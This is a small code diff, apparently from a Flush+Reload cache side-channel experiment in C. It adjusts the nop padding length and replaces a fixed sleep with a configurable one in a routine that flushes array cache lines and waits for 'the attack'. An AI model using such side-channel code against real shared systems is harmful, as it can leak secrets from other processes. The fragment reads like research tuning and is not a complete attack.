@@ -9,7 +9,7 @@ char* array;
 volatile void spacer() {
 	asm(
 		// ".rept 2235;"
-		".rept 1643;"
+		".rept 1581;"
 		"nop;"
 		".endr;"
 	);
@@ -29,9 +29,10 @@ void flushAndReload(int* timer){
 		clflush((void*)(&array[i*offset]));
 	}
 	// wait some time for the attack to happen
-	// sleep(sleepTime);
-	//sched_yield();
-	sleep(5);
+	// for(int i=0; i<5; i++){
+	// 	sched_yield();
+	// }
+	sleep(sleepTime);
 	// _mm_pause();
 	// for(int i=lowerBound; i<=upperBound; i++){
 	// 	// int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
